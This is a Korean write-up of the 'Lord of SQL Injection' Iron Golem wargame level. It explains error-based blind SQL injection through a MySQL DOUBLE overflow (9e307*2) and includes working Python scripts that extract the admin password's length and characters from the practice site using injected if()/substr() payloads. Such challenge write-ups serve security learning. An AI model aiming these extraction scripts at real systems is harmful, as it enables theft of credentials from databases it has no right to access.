# Lord of SQL Injection No.21 -Iron Golem
## 문제 출제 의도
Error Based SQL Injection의 이해 여부를 확인한다.
## 소스 코드 분석
+ 소스코드
~~~
    <?php
    include "./config.php"; 
    login_chk(); 
    dbconnect(); 
    if(preg_match('/prob|_|\.|\(\)/i', $_GET[pw])) exit("No Hack ~_~");
    if(preg_match('/sleep|benchmark/i', $_GET[pw])) exit("HeHe");
    $query = "select id from prob_iron_golem where id='admin' and pw='{$_GET[pw]}'";
    $result = @mysql_fetch_array(mysql_query($query));
    if(mysql_error()) exit(mysql_error());
    echo "<hr>query : <strong>{$query}</strong><hr><br>"; 
    $_GET[pw] = addslashes($_GET[pw]);
    $query = "select pw from prob_iron_golem where id='admin' and pw='{$_GET[pw]}'";
    $result = @mysql_fetch_array(mysql_query($query));
    if(($result['pw']) && ($result['pw'] == $_GET['pw'])) solve("iron_golem");
    highlight_file(__FILE__);
    ?>
~~~

+ 소스 코드 분석
    - 금지 문자, 문자열
        * GET 방식으로 받은 pw값에 'prob _ . ( )중 하나라도 있다면 "No Hack~_~"이 출력되고 문제 풀이에 실패한다.
        * GET방식으로 받은 pw값에 "sleep", "benchmark" 중 하나라도 있다면 "HeHe"가 출력되고 문제풀이에 실패한다.
    - 에러 출력
        ~~~
        if(mysql_error()) exit(mysql_error());
        ~~~
        * MySQL 쿼리 수행에 오류가 있으면 오류를 출력하고 문제 풀이에 실패한다. 
    - 풀이 성공 조건
        * 데이터베이스에서 받은 pw와 GET방식으로 전달받은 pw가 같아야 한다.
## 문제 해결
- Mysql 지수 연산 최대치 이용
    + MySQL에서는 e를 이용한 지수 연산이 가능하다.
    ~~~
    >>> 9e0
    9.0
    >>> 9e1
    90.0
    >>>9e10
    90000000000.0
    ~~~
    + 지수 연산의 최대치는 9e307이다.
    + 9e308부터는 ERROR 1367 (22007): Illegal double '9e308' value found during parsing 와 같이 에러가 난다.
    + 이를 이용하여 9e307*2등을 이용해 에러를 유도 할 수 있다.
- pw 길이
    + 다음의 코드를 이용하여 pw의 길이를 구할 수 있다.
    ~~~
    import urllib.request
    from urllib.parse import quote

    key = ""
    i=1
    pwlen = 0

    while i :
        url = "http://los.eagle-jump.org/iron_golem_d54668ae66cb6f43e92468775b1d1e38.php?pw="
        data = "' or id='admin' and if((length(pw)='{}'),9e307*2,0)#".format(str(i))
        print(data)
        
        data = quote(data)
        re = urllib.request.Request(url + data)
        re.add_header("User-agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.75 Safari/537.36")
        re.add_header("Cookie", "PHPSESSID=4csf3od9cfat47akhjak8okpi6")

        response = urllib.request.urlopen(re)

        if str(response.read()).find("DOUBLE value is out of range") != -1:
            pwlen = i
            print('pw length : ' + str(pwlen))
            break   
        i+=1    
    ~~~
    + 위 코드를 실행하면 pw=16이 출력된다.
- pw 값
    + if문
        * if 문은 다음과 같은 형식을 취한다.
        ~~~
        if(값,참일때,거짓일때)
        ~~~
    + pw 의 값은 다음과 같은 코드를 이용해 알아내면 편리하다.
    ~~~
    import urllib.request
    from urllib.parse import quote

    for i in range(1, pwlen + 1):
        for j in range(32, 127):
            url = "http://los.eagle-jump.org/iron_golem_d54668ae66cb6f43e92468775b1d1e38.php?pw="
            data = "' or id='admin' and if((substr(pw, 1, {})='{}'),9e307*2,0)#".format(str(i), key + chr(j))
            print(data)

            data = quote(data)
            re = urllib.request.Request(url + data)
            re.add_header("User-agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.75 Safari/537.36")
            re.add_header("Cookie", "PHPSESSID=4csf3od9cfat47akhjak8okpi6")

            req = urllib.request.urlopen(re)

            if str(req.read()).find("DOUBLE value is out of range") != -1:
                key += chr(j).lower()
                print(key)
                break
    print(key)
    ~~~
    + 이를 실행하면 pw=!!!!이 출력된다.
    + !!!!을 pw에 GET방식으로 입력하면 문제 풀이에 성공한다.